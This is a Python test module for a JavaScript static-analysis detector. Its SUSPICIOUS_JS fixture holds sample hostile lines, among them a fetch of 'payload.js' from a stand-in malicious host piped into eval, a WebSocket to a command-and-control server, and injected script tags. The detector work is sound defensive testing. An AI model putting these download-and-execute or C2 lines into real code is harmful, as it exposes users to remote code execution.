"""
Test module for static_analysis.py
"""
import pytest
from app.utils.static_analysis import (
    analyze_javascript, 
    get_pattern_count, 
    calculate_suspicion_score, 
    analyze_file_content
)

# Test data for JavaScript analysis
BENIGN_JS = """
function greet(name) {
    console.log("Hello, " + name + "!");
    return "Greeting completed";
}

// Simple DOM manipulation
document.getElementById("demo").innerHTML = "Hello World!";
"""

SUSPICIOUS_JS = """
// Obfuscated code using eval
eval("console.log('This is executed from eval');");

// Using the Function constructor for dynamic code execution
const dynamicFunc = new Function("a", "b", "return a + b");

// Encoding/decoding
const encoded = btoa("secret data");
const decoded = atob(encoded);

// DOM manipulation
document.write("<script>alert('Injected!');</script>");

// Base64 string
const base64Data = "SGVsbG8gV29ybGQh";

// Network access
fetch("https://malicious-site.com/payload.js")
    .then(response => response.text())
    .then(data => eval(data));

// WebSocket for C2
const ws = new WebSocket("ws://command-server.com/socket");

// String obfuscation
const obfuscated = String.fromCharCode(72, 101, 108, 108, 111);

// Environment fingerprinting
if (navigator.userAgent.indexOf("Chrome") > -1) {
    console.log("Running in Chrome");
}
"""


def test_analyze_javascript_benign():
    """Test JavaScript analysis with benign code."""
    results = analyze_javascript(BENIGN_JS)
    assert len(results) == 0, "Benign JS should not have detections"


def test_analyze_javascript_suspicious():
    """Test JavaScript analysis with suspicious code."""
    results = analyze_javascript(SUSPICIOUS_JS)
    assert len(results) > 0, "Suspicious JS should have detections"
    
    # Check for specific patterns
    pattern_names = [result["pattern_name"] for result in results]
    assert "eval_usage" in pattern_names, "Should detect eval usage"
    assert "function_constructor" in pattern_names, "Should detect Function constructor"
    assert "encoded_strings" in pattern_names, "Should detect encoded strings"
    assert "document_write" in pattern_names, "Should detect document.write"
    assert "network_access" in pattern_names, "Should detect network access"
    assert "websocket_usage" in pattern_names, "Should detect WebSocket usage"
    assert "string_obfuscation" in pattern_names, "Should detect string obfuscation"
    assert "environment_detection" in pattern_names, "Should detect environment detection"


def test_get_pattern_count():
    """Test pattern count calculation."""
    results = analyze_javascript(SUSPICIOUS_JS)
    pattern_count = get_pattern_count(results)
    
    assert isinstance(pattern_count, dict), "Should return a dictionary"
    assert len(pattern_count) > 0, "Should have pattern counts"
    assert all(isinstance(count, int) for count in pattern_count.values()), "All counts should be integers"


def test_calculate_suspicion_score():
    """Test suspicion score calculation."""
    # Empty results should have score 0
    assert calculate_suspicion_score([]) == 0.0, "Empty results should have score 0"
    
    # Suspicious code should have higher score
    suspicious_results = analyze_javascript(SUSPICIOUS_JS)
    benign_results = analyze_javascript(BENIGN_JS)
    
    suspicious_score = calculate_suspicion_score(suspicious_results)
    benign_score = calculate_suspicion_score(benign_results)
    
    assert suspicious_score > 0.5, "Suspicious code should have high score"
    assert benign_score == 0.0, "Benign code should have low score"
    assert suspicious_score > benign_score, "Suspicious score should be higher than benign"


def test_analyze_file_content():
    """Test the main analyze_file_content function."""
    # Test with JavaScript file
    js_result = analyze_file_content(SUSPICIOUS_JS, "javascript")
    assert js_result["success"] is True, "Analysis should succeed"
    assert "results" in js_result, "Should have results"
    assert "summary" in js_result, "Should have summary"
    assert "suspicion_score" in js_result["summary"], "Should have suspicion score"
    
    # Test with unsupported file type
    unsupported_result = analyze_file_content("Some content", "unsupported")
    assert unsupported_result["success"] is False, "Should fail for unsupported file type"
    assert "error" in unsupported_result, "Should have error message"
    
    # Test with empty content
    empty_result = analyze_file_content("", "javascript")
    assert empty_result["success"] is False, "Should fail for empty content"
    assert "error" in empty_result, "Should have error message" 